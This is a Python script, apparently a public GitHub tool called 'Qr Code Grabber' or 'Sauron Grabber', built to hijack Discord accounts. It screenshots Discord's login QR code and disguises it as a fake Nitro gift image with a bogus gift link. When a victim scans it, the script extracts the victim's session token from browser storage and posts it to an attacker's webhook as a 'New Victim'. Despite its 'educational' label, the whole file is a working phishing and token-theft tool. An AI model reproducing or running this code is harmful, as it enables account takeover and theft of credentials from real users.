from selenium import webdriver
from selenium.webdriver.common.by import By
import chromedriver_autoinstaller
from time import sleep
import urllib.request
from PIL import Image, ImageDraw, ImageFilter
import requests, random, string
from pystyle import *
import os
clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')


#########################################################
#           github.com/cloudzik1337                     #
#           Qr Code Grabber                             #
#           Only For Educational purpouses              #
#                                                       #
#########################################################
#---------------User Area----------------
WeebHook = ''









ascii = '''
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
██ ▄▄ █ ▄▄▀███ ▄▄▄█ ▄▄▀█ ▄▄▀█ ▄▄▀█ ▄▄▀█ ▄▄█ ▄▄▀██
██ ██ █ ▀▀▄███ █▄▀█ ▀▀▄█ ▀▀ █ ▄▄▀█ ▄▄▀█ ▄▄█ ▀▀▄██
██▄▄ ▀█▄█▄▄███▄▄▄▄█▄█▄▄█▄██▄█▄▄▄▄█▄▄▄▄█▄▄▄█▄█▄▄██
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
'''

print(Colors.green)
Cursor.HideCursor()

def CenterPrint(*args, **kwargs):
    print(Center.XCenter(*args, **kwargs))
    





class QrGrabber:
    def __init__(self):
        chromedriver_autoinstaller.install()
        options = webdriver.ChromeOptions()
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_experimental_option('detach', True)
        self.driver = webdriver.Chrome(options=options)

    def RenderPng(self):
        self.driver.get('https://discord.com/login')
        sleep(2)
        qrcode = self.driver.find_element(by=By.XPATH, value='//*[@id="app-mount"]/div[2]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]/div[2]').screenshot('data/qrcode.png')
        self.discord_login = self.driver.current_url
        background = Image.open('data/Background.png')
        qr = Image.open('data/qrcode.png')
        qr = qr.resize((100,100), Image.ANTIALIAS)
        ReadyImg = background.copy()
        ReadyImg.paste(qr, (120, 60))
        ReadyImg.save('GeneratedNitro.png')
        CenterPrint('[!] Qr Code Has Been Generated (GeneratedNitro.png).')
        CenterPrint(f'[=] Optionally you can use this link too https:​‌‌‌//discord.gift/{random.randint(100000, 999999)} (Fake Wont show expired gift)')
        return self.FetchToken()
    def FetchToken(self):
        while True:
            if self.discord_login != self.driver.current_url:
                token = self.driver.execute_script('''
            window.dispatchEvent(new Event('beforeunload'));
            let iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            let localStorage = iframe.contentWindow.localStorage;
            var token = JSON.parse(localStorage.token);
            return token;  
            ''')
                CenterPrint('[!] Got Token ' + str(token))
                return token
                break

class Weebhook:
    def __init__(self, token, WeebHook):
        self.token = token
        self.Weebhook = WeebHook
    def send(self):
        WBJSON = { 
    "username": "Sauron Grabber",
    "avatar_url": "https://static.wikia.nocookie.net/lotr/images/9/90/Sauron-2.jpg",
    "content": "",
    "embeds": [
        {
        "title": "New Victim",
        "color": 0,
        "description": f"""
        Token `{self.token}`
        """,
        "timestamp": "2115-02-18T13:34:00.000Z",
        "author": {
            "name": "Sauron Grabber"
        },
        "image": {},
        "thumbnail": {},
        "footer": {
            "text": "Sauron Grabber"
        },
        "fields": []
        }
    ],
}

        if requests.post(self.Weebhook, json=WBJSON).status_code in (200, 201, 202, 203, 204):
            CenterPrint('[!] Results Posted On Weebhook')
        else:
            CenterPrint('[?] Failed to post results')

print(Center.XCenter(ascii))
CenterPrint('[1] Add weebhook (Overide Existing One)')
CenterPrint('[2] Generate Qr Code')
while True:
    answer = input('#')
    if answer.isdigit() and int(answer) <= 2:
        answer = int(answer)
    if answer == 1:
        WeebHook = input('Weebhook Here # ')
        clearConsole()
        print(Center.XCenter(ascii))
        CenterPrint('[=] Preparing...')
        answer = 2
        break
    else:
        break
        
if answer == 2:
    token = QrGrabber().RenderPng()
    if WeebHook != '':
        Weebhook(token, WeebHook).send()
